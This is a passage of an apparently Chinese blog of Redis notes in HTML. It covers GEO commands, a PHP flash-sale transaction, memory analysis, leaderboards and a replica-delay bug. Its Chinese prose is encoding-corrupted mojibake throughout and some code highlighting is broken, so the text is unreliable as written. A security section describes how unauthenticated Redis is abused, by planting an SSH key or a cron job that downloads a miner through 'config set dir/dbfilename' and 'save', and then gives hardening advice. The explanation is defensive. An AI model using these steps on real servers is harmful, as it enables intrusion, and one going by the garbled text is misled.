class="line">å…¶ä»–å‘½ä»¤ï¼š</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿”å›çµéšå¯º,çŠ¶å…ƒå³°çš„ä½ç½®</span></span><br><span class="line">$ret = $redis-&gt;rawCommand(<span class="string">'GEOPOS'</span>, <span class="string">'location'</span>,<span class="string">'çµéšå¯º'</span>, <span class="string">'çŠ¶å…ƒå³°'</span>);</span><br><span class="line">print_r($ret);</span><br><span class="line"><span class="comment">// è¿”å›'120.114253','30.219759'åæ ‡é™„è¿‘1kmçš„åœ°å€</span></span><br><span class="line">$ret = $redis-&gt;rawCommand(<span class="string">'GEORADIUS'</span>, <span class="string">'location'</span>,<span class="string">'120.114253'</span>,<span class="string">'30.219759'</span>, <span class="number">1</span>, <span class="string">'km'</span>, <span class="string">'WITHDIST'</span>);</span><br><span class="line">print_r($ret);</span><br><span class="line">$ret = $redis-&gt;rawCommand(<span class="string">'GEOHASH'</span>, <span class="string">'location'</span>,<span class="string">'é¾™äº•æ‘'</span>, <span class="string">'çµéšå¯º'</span>);</span><br><span class="line">print_r($ret);</span><br><span class="line">https:<span class="comment">//learnku.com/articles/35871</span></span><br></pre></td></tr></table></figure>
<h3 id="åŸºäºredisçš„ç§’æ€"><a href="#åŸºäºredisçš„ç§’æ€" class="headerlink" title="åŸºäºredisçš„ç§’æ€"></a>åŸºäºredisçš„ç§’æ€</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å®ä¾‹åŒ–redis</span></span><br><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line"><span class="comment">//è¿æ¥</span></span><br><span class="line">$redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br><span class="line">$key = <span class="string">'sale'</span>;</span><br><span class="line"><span class="comment">//æ£€æµ‹æ˜¯å¦è¿æ¥æˆåŠŸ</span></span><br><span class="line"><span class="comment">// echo "Server is running: " . $redis-&gt;ping();</span></span><br><span class="line">$redis-&gt;setnx($key, <span class="number">0</span>);</span><br><span class="line">$redis-&gt;watch($key); <span class="comment">//ç›‘æµ‹ä¸€ä¸ªkeyçš„å€¼æ˜¯å¦è¢«æ›´æ”¹</span></span><br><span class="line"></span><br><span class="line">$sale_num = $redis-&gt;get($key);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($sale_num &gt; <span class="number">4</span>) &#123;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$redis-&gt;multi(); <span class="comment">//æ ‡è®°äº‹åŠ¡</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$redis-&gt;incr($key);  <span class="comment">//é”€é‡+1</span></span><br><span class="line">sleep(<span class="number">1</span>); <span class="comment">//æ¨¡æ‹ŸçœŸå®ç¯å¢ƒ</span></span><br><span class="line">$ret = $redis-&gt;exec(); <span class="comment">// äº‹åŠ¡å—å†…æ‰€æœ‰å‘½ä»¤çš„è¿”å›å€¼ï¼ŒæŒ‰å‘½ä»¤æ‰§è¡Œçš„å…ˆåé¡ºåºæ’åˆ—ã€‚</span></span><br><span class="line"><span class="keyword">if</span> ($ret) &#123;</span><br><span class="line">    include <span class="string">'db.php'</span>;</span><br><span class="line">    $db = <span class="keyword">new</span> db([</span><br><span class="line">        <span class="string">'database_type'</span> =&gt; <span class="string">'mysql'</span>,</span><br><span class="line">        <span class="string">'database_name'</span> =&gt; <span class="string">'test'</span>,</span><br><span class="line">        <span class="string">'server'</span> =&gt; <span class="string">'www.13sai.com&amp;#39;,</span></span><br><span class="line"><span class="string">        '</span>username<span class="string">' =&gt; '</span><span class="number">13</span>sai<span class="string">',</span></span><br><span class="line"><span class="string">        '</span>password<span class="string">' =&gt; '</span>*<span class="string">',</span></span><br><span class="line"><span class="string">        '</span>charset<span class="string">' =&gt; '</span>utf8<span class="string">'</span></span><br><span class="line"><span class="string">    ]);</span></span><br><span class="line"><span class="string">    $db-&gt;update('</span>goods<span class="string">', ["stock_num[-]" =&gt; 1], ['</span>id<span class="string">' =&gt; 1]);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="æŸ¥çœ‹æ‰€æœ‰-key-çš„-value-å€¼æ‰€å å†…å­˜å¤§å°"><a href="#æŸ¥çœ‹æ‰€æœ‰-key-çš„-value-å€¼æ‰€å å†…å­˜å¤§å°" class="headerlink" title="æŸ¥çœ‹æ‰€æœ‰ key çš„ value å€¼æ‰€å å†…å­˜å¤§å°"></a>æŸ¥çœ‹æ‰€æœ‰ key çš„ value å€¼æ‰€å å†…å­˜å¤§å°</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ pip install rdbtools python-lzf</span><br><span class="line">$ git clone https:<span class="comment">//github.com/sripathikrishnan/redis-rdb-tools</span></span><br><span class="line">$ cd redis-rdb-tools</span><br><span class="line">$ sudo python setup.py install</span><br><span class="line">$ whereis redis.conf</span><br><span class="line">redis: <span class="regexp">/etc/</span>redis.conf</span><br><span class="line">$ cat /etc/redis.conf | grep dir | grep redis</span><br><span class="line">dir /<span class="keyword">var</span>/lib/redis</span><br><span class="line">$ cat /etc/redis.conf | grep dump.rdb</span><br><span class="line">dbfilename dump.rdb</span><br><span class="line">ç»¼ä¸Šï¼Œå¾—çŸ¥å…¶è·¯å¾„ä¸ºï¼š/<span class="keyword">var</span>/lib/redis/dump.rdb</span><br><span class="line"></span><br><span class="line">æŒ‰å†…å­˜å€¼å¯¼å‡º csv</span><br><span class="line"></span><br><span class="line">$ rdb -c memory /<span class="keyword">var</span>/lib/redis/dump.rdb &gt; <span class="regexp">/tmp/</span>redis.csv</span><br><span class="line">https:<span class="comment">//learnku.com/articles/33211</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-å¿«é€Ÿä¸Šæ‰‹"><a href="#Redis-å¿«é€Ÿä¸Šæ‰‹" class="headerlink" title="Redis å¿«é€Ÿä¸Šæ‰‹"></a>Redis å¿«é€Ÿä¸Šæ‰‹</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Redis çš„äº‹åŠ¡å¤„ç†çš„å‘½ä»¤</span><br><span class="line"></span><br><span class="line">MULTIï¼šå¼€å¯ä¸€ä¸ªäº‹åŠ¡ï¼›</span><br><span class="line">EXECï¼šäº‹åŠ¡æ‰§è¡Œï¼Œå°†ä¸€æ¬¡æ€§æ‰§è¡Œäº‹åŠ¡å†…çš„æ‰€æœ‰å‘½ä»¤ï¼›</span><br><span class="line">DISCARDï¼šå–æ¶ˆäº‹åŠ¡ï¼›</span><br><span class="line">WATCHï¼šç›‘è§†ä¸€ä¸ªæˆ–å¤šä¸ªé”®ï¼Œå¦‚æœäº‹åŠ¡æ‰§è¡Œå‰æŸä¸ªé”®å‘ç”Ÿäº†æ”¹åŠ¨ï¼Œé‚£ä¹ˆäº‹åŠ¡ä¹Ÿä¼šè¢«æ‰“æ–­ï¼›</span><br><span class="line">UNWATCHï¼šå–æ¶ˆ WATCH å‘½ä»¤å¯¹æ‰€æœ‰é”®çš„ç›‘è§†ã€‚</span><br><span class="line"></span><br><span class="line">éœ€è¦è¯´æ˜çš„æ˜¯ Redis å®ç°äº‹åŠ¡æ˜¯åŸºäº COMMAND é˜Ÿåˆ—ï¼Œ</span><br><span class="line">å¦‚æœ Redis æ²¡æœ‰å¼€å¯äº‹åŠ¡ï¼Œé‚£ä¹ˆä»»ä½•çš„ COMMAND éƒ½ä¼šç«‹å³æ‰§è¡Œå¹¶è¿”å›ç»“æœã€‚</span><br><span class="line">å¦‚æœ Redis å¼€å¯äº†äº‹åŠ¡ï¼ŒCOMMAND å‘½ä»¤ä¼šæ”¾åˆ°é˜Ÿåˆ—ä¸­ï¼Œå¹¶ä¸”è¿”å›æ’é˜Ÿçš„çŠ¶æ€ QUEUEDï¼Œ</span><br><span class="line">åªæœ‰è°ƒç”¨ EXECï¼Œæ‰ä¼šæ‰§è¡Œ COMMAND é˜Ÿåˆ—ä¸­çš„å‘½ä»¤ã€‚</span><br><span class="line">ç©å®¶æ’è¡Œæ¦œæ¡ˆä¾‹</span><br><span class="line"></span><br><span class="line">ç»Ÿè®¡å…¨éƒ¨ç©å®¶çš„æ’è¡Œæ¦œ</span><br><span class="line">ZREVRANGE user_score <span class="number">0</span> <span class="number">-1</span> WITHSCORES</span><br><span class="line"></span><br><span class="line">æŒ‰åæ¬¡æŸ¥è¯¢æ’åå‰ N åçš„ç©å®¶</span><br><span class="line">ç»Ÿè®¡å‰ <span class="number">10</span> åç©å®¶ï¼Œå¯ä»¥ä½¿ç”¨ï¼šZREVRANGE user_score <span class="number">0</span> <span class="number">9</span></span><br><span class="line"></span><br><span class="line">æŸ¥è¯¢æŸä¸ªç©å®¶çš„åˆ†æ•°</span><br><span class="line">æŸ¥è¯¢ç©å®¶ <span class="number">10001</span> çš„åˆ†æ•°å¯ä»¥ä½¿ç”¨ï¼šZSCORE user_score <span class="number">10001</span></span><br><span class="line"></span><br><span class="line">æŸ¥è¯¢æŸä¸ªç©å®¶çš„æ’å</span><br><span class="line">æŸ¥è¯¢ç©å®¶ <span class="number">10001</span> çš„æ’åå¯ä»¥ä½¿ç”¨ï¼šZREVRANK user_score <span class="number">10001</span></span><br><span class="line"></span><br><span class="line">å¯¹ç©å®¶çš„åˆ†æ•°å’Œæ’åè¿›è¡Œæ›´æ–°</span><br><span class="line">å¯¹ç©å®¶ <span class="number">10001</span> çš„åˆ†æ•°å‡ <span class="number">1</span>ï¼Œå¯ä»¥ä½¿ç”¨ï¼šZINCRBY user_score <span class="number">-1</span> <span class="number">10001</span></span><br><span class="line"></span><br><span class="line">æŸ¥è¯¢æŒ‡å®šç©å®¶å‰å M åçš„ç©å®¶</span><br><span class="line">æŸ¥è¯¢ç©å®¶ <span class="number">10001</span> å‰å <span class="number">5</span> åç©å®¶éƒ½æ˜¯è°ï¼Œå½“å‰å·²çŸ¥ç©å®¶ <span class="number">10001</span> çš„æ’åæ˜¯ <span class="number">18036</span>ï¼Œ</span><br><span class="line">é‚£ä¹ˆå¯ä»¥ä½¿ç”¨ï¼šZREVRANGE user_score <span class="number">18031</span> <span class="number">18041</span></span><br><span class="line"></span><br><span class="line">å¢åŠ æˆ–ç§»é™¤æŸä¸ªç©å®¶ï¼Œå¹¶å¯¹æ’åè¿›è¡Œæ›´æ–°</span><br><span class="line">åˆ é™¤ç©å®¶ <span class="number">10001</span>ï¼Œå¯ä»¥ä½¿ç”¨ï¼šZREM user_score <span class="number">10001</span></span><br><span class="line">æŸ¥è¯¢ä¸‹æ’ååœ¨ <span class="number">18031</span> åˆ° <span class="number">18041</span> çš„ç©å®¶æ˜¯è°ï¼Œä½¿ç”¨ï¼šZREVRANGE user_score <span class="number">18031</span> <span class="number">18041</span></span><br><span class="line"></span><br><span class="line">æŠŠç©å®¶ <span class="number">10001</span> çš„ä¿¡æ¯å†å¢åŠ å›æ¥ï¼Œä½¿ç”¨ï¼šZADD user_score <span class="number">93.1504697596</span> <span class="number">10001</span></span><br><span class="line">çœ‹ä¸‹æ’ååœ¨ <span class="number">18031</span> åˆ° <span class="number">18041</span> çš„ç©å®¶æ˜¯è°ï¼Œä½¿ç”¨ï¼šZREVRANGE user_score <span class="number">18031</span> <span class="number">18041</span></span><br><span class="line">https:<span class="comment">//learnku.com/articles/37066</span></span><br></pre></td></tr></table></figure>
<h3 id="rediså®‰å…¨"><a href="#rediså®‰å…¨" class="headerlink" title="rediså®‰å…¨"></a>rediså®‰å…¨</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Redis é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨ <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">6379</span>ï¼Œåœ¨æ²¡æœ‰åˆ©ç”¨é˜²ç«å¢™è¿›è¡Œå±è”½çš„æƒ…å†µä¸‹ï¼Œå°†ä¼šå°† Redis æœåŠ¡æš´éœ²åˆ°å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰å¼€å¯è®¤è¯çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—® Redis ä»¥åŠè¯»å– Redis çš„æ•°æ®ã€‚æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—® Redis çš„æƒ…å†µä¸‹åˆ©ç”¨ Redis çš„ç›¸å…³æ–¹æ³•ï¼Œå¯ä»¥æˆåŠŸå°†è‡ªå·±çš„å…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„ ~<span class="regexp">/.ssh æ–‡ä»¶å¤¹çš„ authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ç›´æ¥ç™»å½•ç›®æ ‡æœåŠ¡å™¨ï¼›å¦‚æœ Redis æœåŠ¡æ˜¯ä»¥ root æƒé™å¯åŠ¨ï¼Œå¯ä»¥åˆ©ç”¨è¯¥é—®é¢˜ç›´æ¥è·å¾—æœåŠ¡å™¨ root æƒé™ã€‚</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">ç»è¿‡å¯¹æ•è·çš„äº‹ä»¶è¿›è¡Œåˆ†æï¼Œæ•´ä¸ªå…¥ä¾µæµç¨‹å¤§æ¦‚æ˜¯åŒ…å«ä»¥ä¸‹å‡ ä¸ªç¯èŠ‚ï¼š</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">æ‰«æå¼€æ”¾ 6379 ç«¯å£çš„ Linux æœåŠ¡å™¨ï¼ˆåç»­æ„ŸæŸ“æ‰«æç½‘æ®µä¸º 1.0.0.0/</span><span class="number">16</span> åˆ° <span class="number">224.255</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span> ï¼‰</span><br><span class="line">é€šè¿‡ redis-cli å°è¯•è¿æ¥ Redis å¹¶æ‰§è¡Œé¢„ç½®åœ¨.dat æ–‡ä»¶é‡Œçš„åˆ©ç”¨å‘½ä»¤å°† Redis çš„æ•°æ®æ–‡ä»¶ä¿®æ”¹ä¸º /<span class="keyword">var</span>/spool/cron/rootï¼Œç„¶åé€šè¿‡åœ¨ Redis ä¸­æ’å…¥æ•°æ®ï¼Œå°†ä¸‹è½½æ‰§è¡Œè„šæœ¬çš„åŠ¨ä½œå†™å…¥ crontab ä»»åŠ¡</span><br><span class="line">é€šè¿‡è„šæœ¬å®ç°ä»¥ä¸Šçš„ç›¸å…³è¡Œä¸ºï¼Œå®Œæˆæ¤å…¥å¹¶å¯åŠ¨æŒ–çŸ¿ç¨‹åº</span><br><span class="line">Redis æœåŠ¡åŠ å›º</span><br><span class="line"></span><br><span class="line">å¯¼è‡´å…¥ä¾µçš„ä¸»è¦åŸå› æ˜¯ Redis æœªæˆæƒè®¿é—®é—®é¢˜ï¼Œæ‰€ä»¥å¦‚æœè¦æ‰¼åˆ¶å…¥ä¾µçš„å…¥å£ï¼Œéœ€è¦é’ˆå¯¹ Redis æœåŠ¡è¿›è¡ŒåŠ å›ºï¼Œé¿å…é»‘å®¢é€šè¿‡è¯¥é€”å¾„è¿›è¡Œå…¥ä¾µæ¤å…¥æŒ–çŸ¿è •è™«ã€‚</span><br><span class="line">å¦‚æ— å¿…è¦ï¼Œä¿®æ”¹ bind é¡¹ï¼Œä¸è¦å°† Redis ç»‘å®šåœ¨ <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> ä¸Šï¼Œé¿å… Redis æœåŠ¡å¼€æ”¾åœ¨å¤–ç½‘ï¼Œå¯ä»¥é€šè¿‡ iptables æˆ–è€…è…¾è®¯äº‘ç”¨æˆ·å¯ä»¥é€šè¿‡å®‰å…¨ç»„é™åˆ¶è®¿é—®æ¥æº</span><br><span class="line">åœ¨ä¸å½±å“ä¸šåŠ¡çš„æƒ…å†µï¼Œä¸è¦ä»¥ root å¯åŠ¨ Redis æœåŠ¡ï¼ŒåŒæ—¶å»ºè®®ä¿®æ”¹é»˜è®¤çš„ <span class="number">6379</span> ç«¯å£ï¼Œå¤§éƒ¨åˆ†é’ˆå¯¹ Redis æœªæˆæƒé—®é¢˜çš„å…¥ä¾µéƒ½æ˜¯é’ˆå¯¹é»˜è®¤ç«¯å£è¿›è¡Œçš„</span><br><span class="line">é…ç½® AUTHï¼Œå¢åŠ å¯†ç æ ¡éªŒï¼Œè¿™æ ·å³ä½¿å¼€æ”¾åœ¨å…¬ç½‘ä¸Šï¼Œå¦‚æœéå¼±å£ä»¤çš„æƒ…å†µï¼Œé»‘å®¢ä¹Ÿæ— æ³•è®¿é—® Redis æœåŠ¡è¿›è¡Œç›¸å…³æ“ä½œ</span><br><span class="line">ä½¿ç”¨ rename-command CONFIG <span class="string">"RENAME_CONFIG"</span>é‡å‘½åç›¸å…³å‘½ä»¤ï¼Œè¿™æ ·é»‘å®¢å³ä½¿åœ¨è¿æ¥ä¸Šæœªæˆæƒé—®é¢˜çš„ Redis æœåŠ¡ï¼Œåœ¨ä¸çŸ¥é“å‘½ä»¤çš„æƒ…å†µä¸‹åªèƒ½è·å–ç›¸å…³æ•°æ®ï¼Œè€Œæ— æ³•è¿›ä¸€æ­¥åˆ©ç”¨ https:<span class="comment">//www.v2ex.com/t/584369</span></span><br><span class="line">docker çš„ -p å¦‚æœç›´æ¥ <span class="number">6379</span>:<span class="number">6379</span> æ˜¯ä¼šé»˜è®¤ç»‘å®š <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> çš„ï¼Œè€Œä¸”è¿˜ä¼šè‡ªåŠ¨æ‰“å¼€é˜²ç«å¢™çš„è¿™ä¸ªç«¯å£ï¼Œä¸æ³¨æ„å¾ˆå®¹æ˜“è¢«å‘çš„ï¼Œå¿…é¡»è¦-p <span class="number">127.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">6379</span>:<span class="number">6379</span> è¿™æ ·ç”¨æ‰è¡Œ</span><br><span class="line">Redis ä¹Ÿè¢«æŒ–çŸ¿æ”»å‡»ï¼ https:<span class="comment">//cn.v2ex.com/t/623847#reply27  </span></span><br><span class="line"><span class="comment">// å®ƒè¿™ä¸ªè„šæœ¬ä¿å­˜åœ¨ value é‡Œï¼Œæ€ä¹ˆæ‰èƒ½è¢«æ‰§è¡Œåˆ°  æ˜¾ç„¶ redis å…¬ç½‘å¼€æ”¾ï¼Œå¹¶ä¸”æ— è®¤è¯ å¦‚æœ redis è¢«æ¶æ„ç¨‹åºè®¿é—®åˆ°äº†ï¼Œé‚£ä¹ˆå¯ä»¥åˆ©ç”¨</span></span><br><span class="line"> </span><br><span class="line">config set dir xxx</span><br><span class="line">config set dbfilename xxxx</span><br><span class="line">set xxx</span><br><span class="line">save</span><br><span class="line"> </span><br><span class="line">è¿™å‡ æ¡å‘½ä»¤åœ¨ linux ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶ã€‚ https:<span class="comment">//p0sec.net/index.php/archives/69/</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-scardä¸»ä»å»¶æ—¶é—®é¢˜"><a href="#Redis-scardä¸»ä»å»¶æ—¶é—®é¢˜" class="headerlink" title="Redis scardä¸»ä»å»¶æ—¶é—®é¢˜"></a>Redis scardä¸»ä»å»¶æ—¶é—®é¢˜</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setPrize</span>(<span class="params">$arrPrizes</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// çœŸå®çš„å¥–å“æ˜¯ç”±ä¸Šé¢çš„å‚æ•°$arrPrizesä¼ å…¥ï¼Œæ•°æ®æ ¼å¼å¦‚ä¸‹ï¼š</span></span><br><span class="line">        <span class="comment">// $arrPrizes = array(</span></span><br><span class="line">        <span class="comment">//     array('code' =&gt; 'A0001', 'name' =&gt; 'iPhone'),</span></span><br><span class="line">        <span class="comment">//     array('code' =&gt; 'A0002', 'name' =&gt; 'iPhone'),</span></span><br><span class="line">        <span class="comment">// );</span></span><br><span class="line">        foreach ($arrPrizes <span class="keyword">as</span> $intIndex =&gt; $arrPrize) &#123;</span><br><span class="line">            $arrPrizes[$intIndex] = json_encode($arrPrize);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è·å–Rediså®ä¾‹</span></span><br><span class="line">        $objRedis       = RedisUtil::getInstance();</span><br><span class="line">        $strRedisKey    = <span class="string">'www.daemoncoder.com'</span>;</span><br><span class="line">        $arrPrizePages  = array_chunk($arrPrizes, <span class="number">100</span>);</span><br><span class="line">        foreach ($arrPrizePages <span class="keyword">as</span> $arrPrizePage) &#123;</span><br><span class="line">            <span class="comment">// åˆ†æ‰¹å†™å…¥redisä¸­</span></span><br><span class="line">            $intAddResult = $objRedis-&gt;sAddArray($strRedisKey, $arrPrizePage);</span><br><span class="line">            echo sprintf(<span class="string">"AddResult: %s\n"</span>, var_export($intAddResult, <span class="literal">true</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åˆ¤æ–­å†™å…¥çš„é›†åˆæœ€ç»ˆå¤§å°æ˜¯å¦å’Œä¼ å…¥çš„æ•°ç»„å¤§å°ä¸€è‡´</span></span><br><span class="line">        <span class="comment">// ä¸ä¸€è‡´åˆ™ä¸­é—´æœ‰æ•°æ®æ²¡æœ‰æˆåŠŸå†™å…¥ï¼Œéœ€è¦è¿”å›ç»™ä¸Šå±‚é‡è¯•æˆ–è€…æŠ¥è­¦</span></span><br><span class="line">        $intScardResult = $objRedis-&gt;sCard($strRedisKey);</span><br><span class="line">        echo sprintf(<span class="string">"ScardResult: %s\n"</span>, var_export($intScardResult, <span class="literal">true</span>));</span><br><span class="line">        <span class="keyword">if</span> ($intScardResult == count($arrPrizes)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception $e) &#123;</span><br><span class="line">        var_dump($e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">é€šè¿‡sAddArray()å†™å…¥é›†åˆçš„æ•°æ®ï¼Œæœ‰éƒ¨åˆ†è¿˜æ²¡æœ‰ç”Ÿæ•ˆã€‚Redisæœ¬èº«ç”¨å•çº¿ç¨‹å¤„ç†è¯·æ±‚ï¼Œç†è®ºä¸åº”è¯¥å­˜åœ¨å‡ºç°è¿™ç§å»¶æ—¶ï¼Œä½†æ˜¯çº¿ä¸Šç¯å¢ƒçš„Rediså¾€å¾€éƒ½æ˜¯ä¸»ä»ç»“æ„çš„ï¼Œä¸»åº“åˆ°ä»åº“åŒæ­¥æ•°æ®æ˜¯ä¼šæœ‰å»¶æ—¶çš„ï¼Œè¿™ä¹Ÿæ˜¯å‡ºç°è¿™ä¸ªé—®é¢˜çš„çœŸå®çš„åŸå› ã€‚</span><br><span class="line">ä¸Šè¿°ä»£ç ä¸­ç”¨RedisUtil::getInstance()æ¥è·å–rediså®ä¾‹ï¼Œå‰é¢ä¹Ÿæœ‰ä»‹ç»ï¼Œè¿™ä¸ªæ˜¯æˆ‘ä»¬è‡ªå·±å°è£…çš„Rediså·¥å…·ç±»ï¼Œä¼šæ ¹æ®ä¸åŒçš„rediså‘½ä»¤åšè¯»å†™åˆ†ç¦»ã€‚sAddArray()æ˜¯ä¸€ä¸ªå†™è¯·æ±‚ï¼Œä¼šè‡ªåŠ¨é€‰æ‹©ä¸»åº“è¿æ¥æ‰§è¡Œï¼Œè€ŒsCard()æ˜¯ä¸€ä¸ªè¯»è¯·æ±‚ï¼Œé»˜è®¤ä¼šé€‰æ‹©ä»åº“å»æ‰§è¡Œã€‚æ‰€ä»¥ä¼šå‡ºç°ç”¨sCard()è¯»å–ä¸åˆ°é›†åˆçœŸå®çš„å¤§å°ï¼Œå› ä¸ºä»åº“æ­¤æ—¶å¯èƒ½è¿˜æ²¡æœ‰åŒæ­¥åˆ°æœ€æ–°çš„æ•°æ®ã€‚</span><br><span class="line">è§£å†³æ–¹æ¡ˆ</span><br><span class="line"></span><br><span class="line">è°ƒæ•´ä»£ç ï¼Œå¼ºåˆ¶è®©sCard()æ–¹æ³•é€‰æ‹©ä¸»åº“ï¼ˆæ¯ä¸ªäººè¿æ¥çš„Rediså·¥å…·ç±»ä¸åŒï¼Œè¿™é‡Œä¸å†è´´ä»£ç ï¼Œå¤§æ¦‚çš„æ–¹å¼å°±æ˜¯è¿æ¥æ—¶æŒ‡å®šä¸»åº“çš„IPï¼‰ã€‚è¿™æ ·ç»è¿‡å¤šæ¬¡åå¤æµ‹è¯•ï¼Œæ²¡æœ‰å†å‡ºç°è¿™ä¸ªé—®é¢˜ã€‚</span><br><span class="line">https:<span class="comment">//www.daemoncoder.com/a/%E8%AE%B0%E4%B8%80%E6%AC%A1Redis%20scard%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%9C%E4%B8%8D%E5%AF%B9%E7%9A%84%E9%97%AE%E9%A2%98/4d54673d?hmsr=toutiao.io&amp;utm_medium=toutiao.io&amp;utm_source=toutiao.io</span></span><br></pre></td></tr></table></figure>
<h3 id="redisæ•°æ®æŒä¹…åŒ–"><a href="#redisæ•°æ®æŒä¹…åŒ–" class="headerlink" title="redisæ•°æ®æŒä¹…åŒ–"></a>redisæ•°æ®æŒä¹…åŒ–</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 